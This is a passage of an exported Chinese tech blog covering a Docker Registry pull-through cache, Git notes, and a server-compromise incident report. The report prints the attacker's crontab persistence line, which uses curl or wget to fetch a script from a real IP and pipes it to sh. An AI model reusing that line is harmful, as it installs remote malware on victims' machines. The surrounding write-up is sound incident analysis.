v2对镜像存储格式进行了重新设计，并且和旧版还不兼容，docker从1.6版本开始支持registry v2。</p>\n</blockquote>\n<h2 id=\"基于Registry的直通缓存服务（pull-through-cache）\"><a href=\"#基于Registry的直通缓存服务（pull-through-cache）\" class=\"headerlink\" title=\"基于Registry的直通缓存服务（pull-through cache）\"></a>基于Registry的直通缓存服务（pull-through cache）</h2><p>如果您的环境中运行着多个Docker实例，例如多个物理机或虚拟机都运行Docker，则每个Docker守护程序都将访问Internet，并从Docker Hub获取本地没有的映像。<br>为此，我们可以部署一个本地Registry Mirror服务，并将所有Docker引擎的Mirror Sever指向该服务器，以免产生额外的互联网流量。</p>\n<h3 id=\"Registry-mirror的原理\"><a href=\"#Registry-mirror的原理\" class=\"headerlink\" title=\"Registry mirror的原理\"></a>Registry mirror的原理</h3><p>Docker Hub的镜像数据分为两部分：index数据和registry数据。前者保存了镜像的一些元数据信息，数据量很小；后者保存了镜像的实际数据，数据量比较大。平时我们使用docker pull命令拉取一个镜像时的过程是：先去index获取镜像的一些元数据，然后再去registry获取镜像数据。</p>\n<p>所谓registry mirror就是搭建一个registry，然后将docker hub的registry数据缓存到自己本地的registry。<br>整个过程是：当我们使用docker pull去拉镜像的时候，会先从我们本地的registry mirror去获取镜像数据，如果不存在，registry mirror会先从docker hub的registry拉取数据进行缓存，再传给我们。</p>\n<p>整个过程是流式的，registry mirror并不会等全部缓存完再给我们传，而且边缓存边给客户端传。</p>\n<p>对于缓存，我们都知道一致性非常重要。<br>registry mirror与docker官方保持一致的方法是：registry mirror只是缓存了docker hub的registry数据，并不缓存index数据。<br>所以我们pull镜像的步骤是：</p>\n<ul>\n<li>先连docker hub的index获取镜像的元数据，如果我们registry mirror里面有该镜像的缓存，且数据与从index处获取到的元数据一致，则从registry mirror拉取；</li>\n<li>如果我们的registry mirror有该镜像的缓存，但数据与index处获取的元数据不一致，或者根本就没有该镜像的缓存，则先从docker hub的registry缓存或者更新数据。</li>\n</ul>\n<h3 id=\"1-服务端的部署方法\"><a href=\"#1-服务端的部署方法\" class=\"headerlink\" title=\"1. 服务端的部署方法\"></a>1. 服务端的部署方法</h3><p>在一个已经安装Docker引擎的服务器<code>192.168.0.147</code>上部署一个Regsitry服务，其配置文件中，可以增加proxy配置段支持代理缓存服务，格式为：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">proxy:</span></span><br><span class=\"line\">  <span class=\"attr\">remoteurl:</span> <span class=\"string\">https://registry-1.docker.io</span></span><br><span class=\"line\">  <span class=\"attr\">username:</span> [<span class=\"string\">username</span>]</span><br><span class=\"line\">  <span class=\"attr\">password:</span> [<span class=\"string\">password</span>]</span><br></pre></td></tr></table></figure>\n\n<p>注意，缓存默认保存7天，配置信息位于：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">storage:</span></span><br><span class=\"line\">  <span class=\"attr\">maintenance:</span></span><br><span class=\"line\">    <span class=\"attr\">uploadpurging:</span></span><br><span class=\"line\">      <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">      <span class=\"attr\">age:</span> <span class=\"string\">168h</span></span><br><span class=\"line\">      <span class=\"attr\">interval:</span> <span class=\"string\">24h</span></span><br><span class=\"line\">      <span class=\"attr\">dryrun:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"attr\">readonly:</span></span><br><span class=\"line\">      <span class=\"attr\">enabled:</span> <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<p><code>uploadpurging</code>是一个后台过程，该过程会定期从注册表的<code>uploads</code>目录中删除孤立的文件。<br>默认情况下启用该后台进程，并设置以下参数。</p>\n<blockquote>\n<p>TODO: 缓存的镜像的有效期默认是一周（168hour），这个配置似乎并不解决？？？</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数名称</th>\n<th align=\"center\">必选项</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">enabled</td>\n<td align=\"center\">yes</td>\n<td align=\"left\">Set to true to enable upload purging. Defaults to true.</td>\n</tr>\n<tr>\n<td align=\"center\">age</td>\n<td align=\"center\">yes</td>\n<td align=\"left\">Upload directories which are older than this age will be deleted.Defaults to 168h (1 week).</td>\n</tr>\n<tr>\n<td align=\"center\">interval</td>\n<td align=\"center\">yes</td>\n<td align=\"left\">The interval between upload directory purging. Defaults to 24h.</td>\n</tr>\n<tr>\n<td align=\"center\">dryrun</td>\n<td align=\"center\">yes</td>\n<td align=\"left\">Set dryrun to true to obtain a summary of what directories will be deleted. Defaults to false.</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>获取Resistry默认配置文件的方法：<br><code>docker run -it --rm --entrypoint cat registry:2 /etc/docker/registry/config.yml</code></p>\n</blockquote>\n<p>因此，你可以在启动Registry服务时挂载自定义yml文件的方式，实现pull-through cache。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --restart=always --name registry \\</span><br><span class=\"line\">    -p 5000:5000 \\</span><br><span class=\"line\">    -v /data:/var/lib/registry \\</span><br><span class=\"line\">    -v ./myconfig.yml:/var/lib/registry/config.yml \\</span><br><span class=\"line\">    registry:2 </span><br></pre></td></tr></table></figure>\n\n<p>还有一个更方便的方法，不用修改配置文件，直接在启动Registry服务时设置环境变量即可，例如：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -p 5000:5000 -d --restart=always --name registry   \\</span><br><span class=\"line\">  -e REGISTRY_PROXY_REMOTEURL=https://registry-1.docker.io \\</span><br><span class=\"line\">  -v /data:/var/lib/registry \\</span><br><span class=\"line\">  registry:2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-服务端的测试方法\"><a href=\"#2-服务端的测试方法\" class=\"headerlink\" title=\"2. 服务端的测试方法\"></a>2. 服务端的测试方法</h3><p>检查Registry服务是否正常启动，可以通过以下方法：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@bl-local ~]# curl -ski -X GET http://localhost:5000/v2/_catalog</span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Content-Type: application/json; charset=utf-8</span><br><span class=\"line\">Docker-Distribution-Api-Version: registry/2.0</span><br><span class=\"line\">X-Content-Type-Options: nosniff</span><br><span class=\"line\">Date: Sun, 31 Jan 2021 15:58:44 GMT</span><br><span class=\"line\">Content-Length: 66</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;repositories&quot;:[&quot;calico/cni&quot;,&quot;library/alpine&quot;,&quot;library/python&quot;]&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-客户端的配置方法\"><a href=\"#3-客户端的配置方法\" class=\"headerlink\" title=\"3.客户端的配置方法\"></a>3.客户端的配置方法</h3><p>作为直通镜像使用方，需要修改Docker引擎配置文件<code>/etc/docker/daemon.json</code>，并在其中增加<code>registry-mirrors</code>信息段</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@d7y-2:~<span class=\"comment\"># cat &lt;&lt;EOD &gt;/etc/docker/daemon.json</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;http://192.168.0.147:5000&quot;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOD</span><br></pre></td></tr></table></figure>\n\n<p>当然，你也可以在Docker守护进程上，增加启动配置信息，例如：<br><code>--registry-mirror=https://&lt;my-docker-mirror-host&gt;:&lt;port-number&gt;</code></p>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><ol>\n<li>Docker Registry提供的Pull-throgh cache服务部署很方便，但是缺乏UI管理界面导致维护比较困难，一般适合小规模本地部署。</li>\n<li>受到Docker pull机制的制约，Mirror仅支持Docker官方镜像，第三方或者私有仓库的mirror服务比较困难。</li>\n<li>由于Registry负责管理镜像的mainfest信息和镜像层文件，而所有docker pull都是基于上述标准流程和接口方式，因此Harbor、Dragnonfly等镜像管理产品都是必须基于Registry开发，并增加了一些复制、分发、UI管理等功能。</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://docs.docker.com/registry/recipes/mirror/\">Docker Mirror官方文档</a></li>\n<li><a href=\"https://niyanchun.com/deploy-registry-mirror.html\">搭建registry mirror的操作记录</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1413239\">一种Harbor部署私有Mirror服务的不正规方法</a></li>\n<li><a href=\"https://www.sohu.com/a/421272143_609552\">Harbor 2.1新增镜像代理和P2P镜像预热功能</a></li>\n<li><a href=\"https://github.com/dragonflyoss/Dragonfly/issues/525\">为什么 Dragonfly 不能很好的支持 HTTPS 镜像仓库</a></li>\n<li><a href=\"https://github.com/moby/moby/pull/34319\">Github关于Add private-registry mirror support的讨论</a></li>\n<li><a href=\"https://blog.csdn.net/ztsinghua/article/details/51496658\">Docker Registry API接口示例</a></li>\n<li><a href=\"https://blog.csdn.net/hyzhou33550336/article/details/65633502\">容器OCI规范 镜像规范</a></li>\n<li><a href=\"https://xuanwo.io/2019/08/06/oci-intro/\">开放容器标准(OCI) 内部分享</a></li>\n<li><a href=\"https://developer.aliyun.com/article/707053\">浙江移动容器云基于 Dragonfly 的统一文件分发平台生产实践</a></li>\n<li><a href=\"https://my.oschina.net/markz0928/blog/856652\">Docker Registry&#x2F;Distribution概述</a></li>\n</ul>\n"},{"title":"ECS遭遇安全攻击的一次经历","url":"/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/","content":"<p>突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！</p>\n<h2 id=\"服务器的问题表现\"><a href=\"#服务器的问题表现\" class=\"headerlink\" title=\"服务器的问题表现\"></a>服务器的问题表现</h2><img src=\"/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-0.png\" class=\"\" title=\"腾讯云的警告信息汇总\">\n\n<ul>\n<li>登录ECS服务器，用<code>top</code>命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中<code>/tmp/vThHH</code>严重消耗资源，确认中招了！</li>\n</ul>\n<img src=\"/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-1.png\" class=\"\" title=\"SSH暴力破解的警告信息\">\n\n<ul>\n<li>服务器的root口令没有变化，但登录成功时提示有几百个<code>failed login attempts</code>，说明SSH口令已经被暴力破解</li>\n</ul>\n<h2 id=\"系统检查的主要工作\"><a href=\"#系统检查的主要工作\" class=\"headerlink\" title=\"系统检查的主要工作\"></a>系统检查的主要工作</h2><p>主要从以下几个方面入手：</p>\n<ol>\n<li><p>检查网络服务</p>\n<p> 使用<code>netstat -nlp</code>，发现除了22，80，443端口，还对外暴露了可疑的7946端口，调用者是<code>/tmp/vThHH</code>。</p>\n</li>\n<li><p>检查系统进程</p>\n<p> 通过<code>ps -ef</code>命令，跟踪可疑进程<code>/tmp/vThHH</code>，发现父进程就是木马程序<code>/usr/bin/ybznfa2</code>。<br> 进一步检查，发现了木马的加载进程。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">root      4365   736  0 18:30 ?        00:00:00 /usr/sbin/CROND -n</span><br><span class=\"line\">root      4366  4365  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br><span class=\"line\">root      4367  4366  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) |sh</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>检查cron任务</p>\n<p> 该木马由crond启动，通过<code>crontab -u root -l</code>检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">*/15 * * * * (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -fsSL -m180 http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"该木马的工作原理\"><a href=\"#该木马的工作原理\" class=\"headerlink\" title=\"该木马的工作原理\"></a>该木马的工作原理</h2><ul>\n<li>通过网络爬虫等手段收集服务器域名信息</li>\n<li>以服务器默认的root用户，通过ssh暴力破解获得口令</li>\n<li>通过ssh登录，添加cron定时任务，从远端服务器下载木马程序，并存放在多个目录下</li>\n<li>后台启动木马，打开自定义端口进行远程控制</li>\n</ul>\n<h2 id=\"处理措施\"><a href=\"#处理措施\" class=\"headerlink\" title=\"处理措施\"></a>处理措施</h2><ul>\n<li>手工清理cron的任务清单</li>\n<li>手工杀死<code>/tmp/vThHH</code>，<code>/usr/bin/ybznfa2</code>等可疑进程</li>\n<li>手工删除上述木马程序</li>\n<li>检查系统进程、网络服务、定时任务等状态，确认问题解决</li>\n</ul>\n<h2 id=\"如何彻底解决SSH暴力破解的威胁\"><a href=\"#如何彻底解决SSH暴力破解的威胁\" class=\"headerlink\" title=\"如何彻底解决SSH暴力破解的威胁\"></a>如何彻底解决SSH暴力破解的威胁</h2><p>最有效的方法就是，关闭口令登录方式，改为密钥登录，请参见下一片文章。</p>\n<p><em><strong>应该说，腾讯云提供的安全服务还是比较有效的，赞一个！</strong></em></p>\n<hr>\n<h2 id=\"附录1-关于lsof命令\"><a href=\"#附录1-关于lsof命令\" class=\"headerlink\" title=\"附录1: 关于lsof命令\"></a>附录1: 关于lsof命令</h2><p>查看被占用端口的归属进程，可用使用<code>lsof -i:&lt;port&gt;</code>命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos <span class=\"built_in\">log</span>]<span class=\"comment\"># lsof -i:80</span></span><br><span class=\"line\">COMMAND PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class=\"line\">nginx   936  root    6u  IPv4  15296      0t0  TCP *:http (LISTEN)</span><br><span class=\"line\">nginx   937 nginx    6u  IPv4  15296      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure>\n\n<p>查看某个进程使用的系统资源信息，包括文件、端口等，可以使用<code>lsof -p &lt;pid&gt;</code> 命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos <span class=\"built_in\">log</span>]<span class=\"comment\"># lsof -p 527</span></span><br><span class=\"line\">COMMAND   PID USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME</span><br><span class=\"line\">YDService 527 root  cwd       DIR              253,1     4096 525988 /usr/local/qcloud/YunJing/YDEyes</span><br><span class=\"line\">YDService 527 root  rtd       DIR              253,1     4096      2 /</span><br><span class=\"line\">YDService 527 root  txt       REG              253,1  5194952 525989 /usr/local/qcloud/YunJing/YDEyes/YDService</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    68192 266804 /usr/lib64/libbz2.so.1.0.6</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   157424 266780 /usr/lib64/liblzma.so.5.2.2</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    90248 265916 /usr/lib64/libz.so.1.2.7</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    99944 266803 /usr/lib64/libelf-0.170.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    19896 266044 /usr/lib64/libattr.so.1.1.0</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   297360 274746 /usr/lib64/libdw-0.170.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    20032 266047 /usr/lib64/libcap.so.2.22</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    86544 274509 /usr/lib64/libnss_myhostname.so.2</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   106848 265653 /usr/lib64/libresolv-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    31824 265641 /usr/lib64/libnss_dns-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    62184 265643 /usr/lib64/libnss_files-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1  2173512 265625 /usr/lib64/libc-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    88720 262170 /usr/lib64/libgcc_s-4.8.5-20150702.so.1</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1  1139680 265633 /usr/lib64/libm-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   995840 265950 /usr/lib64/libstdc++.so.6.0.19</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    19776 265631 /usr/lib64/libdl-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   144792 265651 /usr/lib64/libpthread-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    44448 265655 /usr/lib64/librt-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   164240 265618 /usr/lib64/ld-2.17.so</span><br><span class=\"line\">YDService 527 root    0w      REG              253,1   227581 525140 /usr/local/qcloud/YunJing/log/ydservice.20190505.<span class=\"built_in\">log</span></span><br><span class=\"line\">YDService 527 root    1u      CHR                1,3      0t0   5078 /dev/null</span><br><span class=\"line\">YDService 527 root    2u  a_inode               0,10        0   5074 [eventpoll]</span><br><span class=\"line\">YDService 527 root    3uW     REG               0,19        3  13104 /run/YDService.pid</span><br><span class=\"line\">YDService 527 root    4u     IPv4              17010      0t0    TCP VM_0_17_centos:45598-&gt;169.254.0.55:lsi-bobcat (ESTABLISHED)</span><br><span class=\"line\">YDService 527 root    5u     unix 0xffff8da7babcec00      0t0  17082 /usr/local/yd.socket.server</span><br><span class=\"line\">YDService 527 root    6u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root    7r  a_inode               0,10        0   5074 inotify</span><br><span class=\"line\">YDService 527 root    8u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root    9u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root   10u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root   11u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root   24u     unix 0xffff8da7bb51fc00      0t0  17639 /usr/local/yd.socket.server</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录2：关于crontab命令\"><a href=\"#附录2：关于crontab命令\" class=\"headerlink\" title=\"附录2：关于crontab命令\"></a>附录2：关于crontab命令</h2><ul>\n<li>crond是常用的木马启动入口，主要的配置文件存放在 <code>/var/spool/cron/</code>目录下。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos etc]<span class=\"comment\"># ls -l /var/spool/cron</span></span><br><span class=\"line\">总用量 4</span><br><span class=\"line\">drwxr-xr-x 2 root root 4096 4月  18 20:58 crontabs</span><br><span class=\"line\">-rw------- 1 root root    0 5月   5 11:10 root</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>也可能存放在<code>/etc/cron.d/</code>等类似目录下。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos etc]<span class=\"comment\"># ls -lF /etc |grep cron</span></span><br><span class=\"line\">-rw-------.  1 root root      541 4月  11 2018 anacrontab</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 4月  30 16:47 cron.d/</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.daily/</span><br><span class=\"line\">-rw-------.  1 root root        0 4月  11 2018 cron.deny</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.hourly/</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.monthly/</span><br><span class=\"line\">-rw-r--r--.  1 root root      451 6月  10 2014 crontab</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.weekly/</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>cron的运行日志保存在<code>/var/log/cron</code>文件中，内容格式为</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos <span class=\"built_in\">log</span>]<span class=\"comment\"># head /var/log/cron</span></span><br><span class=\"line\"></span><br><span class=\"line\">Dec 21 09:11:35 VM_0_17_centos crontab[1627]: (root) LIST (root)</span><br><span class=\"line\">Dec 21 09:11:35 VM_0_17_centos crontab[1626]: (root) REPLACE (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1698]: (root) LIST (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1702]: (root) LIST (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1701]: (root) REPLACE (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1728]: (root) LIST (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1730]: (root) REPLACE (root)</span><br><span class=\"line\">Dec 21 09:12:02 VM_0_17_centos CROND[1811]: (root) CMD (/usr/local/qcloud/stargate/admin/start.sh &gt; /dev/null 2&gt;&amp;1 &amp;)</span><br><span class=\"line\">Dec 21 09:12:32 VM_0_17_centos crond[739]: (CRON) INFO (Shutting down)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><a href=\"http://www.cnblogs.com/longjshz/p/5779215.html\">crontab配置方法的参考文档</a></li>\n</ul>\n"},{"title":"Git 裸仓库的技术分析","url":"/2022/04/21/Git-%E8%A3%B8%E4%BB%93%E5%BA%93%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM-0-17-centos git]# tree /home/git/blog.git -F</span><br><span class=\"line\">/home/git/blog.git</span><br><span class=\"line\">├── branches/</span><br><span class=\"line\">├── config</span><br><span class=\"line\">├── description</span><br><span class=\"line\">├── HEAD</span><br><span class=\"line\">├── hooks/</span><br><span class=\"line\">├── index</span><br><span class=\"line\">├── info/</span><br><span class=\"line\">│   └── exclude</span><br><span class=\"line\">├── objects/</span><br><span class=\"line\">│   ├── info/</span><br><span class=\"line\">│   └── pack/</span><br><span class=\"line\">└── refs/</span><br><span class=\"line\">    ├── heads/</span><br><span class=\"line\">    │   └── master</span><br><span class=\"line\">    └── tags/</span><br></pre></td></tr></table></figure>\n\n<p>注意：git的默认设置是对文件名的大小写不敏感，因此有时修改文件不会触发修改！</p>\n"},{"title":"Git软件版本管理要点","url":"/2021/12/29/Git%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>传统的版本控制系统采用集中化方式（CVCS - Centralized Version Control Systems）包括CVS、Subversion 以及 Perforce 等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。 多年以来，这已成为版本控制系统的标准做法。</p>\n<p>集中式版本管理系统最显而易见的缺点是中央服务器的单点故障。 如果宕机一小时，那么在这一小时内，谁都无法提交更新，也就无法协同工作。 如果中心数据库所在的磁盘发生损坏，又没有做恰当备份，毫无疑问你将丢失所有数据——包括项目的整个变更历史，只剩下人们在各自机器上保留的单独快照。 本地版本控制系统也存在类似问题，只要整个项目的历史记录被保存在单一位置，就有丢失所有历史更新记录的风险。</p>\n<p>于是，分布式版本控制系统（DVCS - Distributed Version Control System）面世了。 在这类系统中，像 Git、Mercurial、Bazaar 以及 Darcs 等，客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来，包括完整的历史记录。这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。 因为每一次的克隆操作，实际上都是一次对代码仓库的完整备份。</p>\n<img src=\"/2021/12/29/Git%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/git.jpg\" class=\"\">\n\n<p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>\n<h2 id=\"二、版本规划\"><a href=\"#二、版本规划\" class=\"headerlink\" title=\"二、版本规划\"></a>二、版本规划</h2><p>通常，我们采用<code>GNU</code>风格的版本号命名格式：主版本号 . 子版本号 [. 修正版本号 [. 发行版本号 ]]。<br>即：<code>Major_Version_Number</code>.<code>Minor_Version_Number</code>[.<code>Revision_Number</code>[.<code>Build_Number</code>]]<br>示例 :<code>1.2.1</code>, <code>2.0</code>, <code>5.0.0 build-13124</code></p>\n<ul>\n<li>Major：主版本号<br>  当软件整体重写，出现不向后兼容的改变时，增加A；<br>  或者可以用来代表不同的产品型号；</li>\n<li>Minor：次版本号<br>  表示功能更新，出现新功能时(不影响 API 的兼容性)，增加B</li>\n<li>Revision：修订号<br>  表示小修改，如修复bug、更改提示语字符等(不影响 API 的兼容性)，只要有修改就增加C</li>\n<li>Build: 发行版本号</li>\n</ul>\n<h3 id=\"常见的发行版本名\"><a href=\"#常见的发行版本名\" class=\"headerlink\" title=\"常见的发行版本名\"></a>常见的发行版本名</h3><ul>\n<li>Alpha：是内测试版本，一般不向外部发布，会有很多Bug，一般只有测试人员使用</li>\n<li>Beta：是公测试版本，这个阶段的版本会一直加入新的功能，在Alpha版之后推出</li>\n<li>RC：Release Candidate，是发行候选版本，不会再加入新的功能了，主要着重于除错</li>\n<li>GA：General Availability，正式发布版本，真正的release版本</li>\n</ul>\n<p>此外，还有一些Windows等传统商业软件的版本名称：</p>\n<ul>\n<li>RTM：Release to Manufacture，是给工厂大量压片的版本，内容跟正式版是一样的，不过RTM版也有出限制、评估版的。但是和正式版本的主要程序代码都是一样的。</li>\n<li>OEM：是给计算机厂商随着计算机贩卖的，也就是随机版。只能随机器出货，不能零售。只能全新安装，不能从旧有操作系统升级。包装不像零售版精美，通常只有一面CD和说明书(授权书)。</li>\n<li>RVL：号称是正式版，其实RVL根本不是版本的名称。它是中文版&#x2F;英文版文档破解出来的。</li>\n<li>EVAL：而流通在网络上的EVAL版，与“评估版”类似，功能上和零售版没有区别。</li>\n<li>RTL：Retail，零售版是真正的正式版，正式上架零售版。在安装盘的i386文件夹里有一个eula.txt，最后有一行EULAID，就是你的版本。<br>比如简体中文正式版是EULAID:WX.4_PRO_RTL_CN，繁体中文正式版是WX.4_PRO_RTL_TW。其中：如果是WX.开头是正式版，WB.开头是测试版。_PRE，代表家庭版；_PRO，代表专业版。</li>\n</ul>\n<h2 id=\"三、分支规划\"><a href=\"#三、分支规划\" class=\"headerlink\" title=\"三、分支规划\"></a>三、分支规划</h2><h3 id=\"master分支\"><a href=\"#master分支\" class=\"headerlink\" title=\"master分支\"></a>master分支</h3><p>定义：存放随时可供在生产环境中部署的代码<br>命名：master<br>权限：由管理员负责维护，其它人只有拉取权限<br>生命周期：伴随着整个项目的生命周期，项目结束时结束<br>补充说明：当开发活动告一段落，产生了一份新的可供部署的代码时，master分支上的代码会被更新。同时，每一次更新，都有对应的版本号标签（tag）</p>\n<h3 id=\"develop分支\"><a href=\"#develop分支\" class=\"headerlink\" title=\"develop分支\"></a>develop分支</h3><p>定义：每次迭代版本的共有开发分支,保存当前最新开发成果的分支，从最新的master分支派生<br>命名：develop<br>权限：由开发人员在各自的feature分支开发完成后，合并至该分支<br>生命周期：一个阶段功能开发开始到本阶段开发结束<br>补充说明：当develop分支上的代码已实现了软件需求说明书中所有的功能，派生出release分支</p>\n<h3 id=\"release分支\"><a href=\"#release分支\" class=\"headerlink\" title=\"release分支\"></a>release分支</h3><p>定义：从develop分支派生，为发布新的产品版本而设计的，在这个分支上的代码允许做缺陷修正、准备发布版本所需的各项说明信息，develop分支可以继续进行新的开发迭代周期<br>命名：release-版本号<br>权限：由管理员从develop分支派生，由开发人员完成修复并提交，再由管理员合并回develop分支和master分支<br>生命周期：一个阶段功能测试开始到本阶段测试结束<br>补充说明：必须合并回develop分支和master分支，合并完成，删除该release分支</p>\n<h3 id=\"hotfix分支\"><a href=\"#hotfix分支\" class=\"headerlink\" title=\"hotfix分支\"></a>hotfix分支</h3><p>定义：在master分支发现bug时，在master的分支上派生出一个hotfixes分支<br>命名：hotfixes-版本号<br>权限：开发人员从master分支派生，完生修复并提交merge request，由管理人员完成合并<br>生命周期：发现master分支bug开始，完成master分支bug结束<br>补充说明：必须合并回develop分支和master分支，合并完成，删除该hotfixes分支</p>\n<h3 